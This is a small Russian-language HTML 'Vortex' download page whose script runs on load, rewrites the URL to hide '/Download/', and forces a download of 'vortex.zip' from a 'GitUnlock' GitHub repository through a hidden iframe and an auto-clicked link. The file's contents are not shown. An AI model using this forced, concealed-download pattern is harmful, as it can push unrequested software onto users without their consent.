<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Vortex | Загрузка</title>
    <meta name="theme-color" content="#000000">
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            color: white;
            background: linear-gradient(-45deg, #000000, #333333, #666666);
            background-size: 400% 400%;
            animation: gradientAnimation 15s ease infinite;
        }
        @keyframes gradientAnimation {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }
        .loader {
            width: 50px;
            height: 50px;
            border: 5px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top-color: #7b1fa2;
            animation: spin 1s ease-in-out infinite;
        }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="loader"></div>

    <script>
        // Функция для очистки URL от /Download/
        function cleanUrl() {
            const url = window.location.href;
            if (url.includes('/Download/')) {
                const cleanUrl = url.replace('/Download/', '/');
                history.replaceState(null, null, cleanUrl);
            }
        }

        // Надежная функция скачивания файла
        function downloadFile() {
            cleanUrl(); // Очищаем URL сразу
            
            // Создаем iframe для скачивания
            const iframe = document.createElement('iframe');
            iframe.src = 'https://github.com/serezanet2/GitUnlock/raw/refs/heads/main/Download/vortex.zip';
            iframe.style.display = 'none';
            document.body.appendChild(iframe);
            
            // Альтернативный метод через ссылку
            setTimeout(() => {
                const link = document.createElement('a');
                link.href = 'https://github.com/serezanet2/GitUnlock/raw/refs/heads/main/Download/vortex.zip';
                link.download = 'vortex.zip';
                document.body.appendChild(link);
                link.click();
                setTimeout(() => document.body.removeChild(link), 100);
            }, 500);
        }

        // Запускаем скачивание сразу
        downloadFile();
    </script>
</body>
</html>
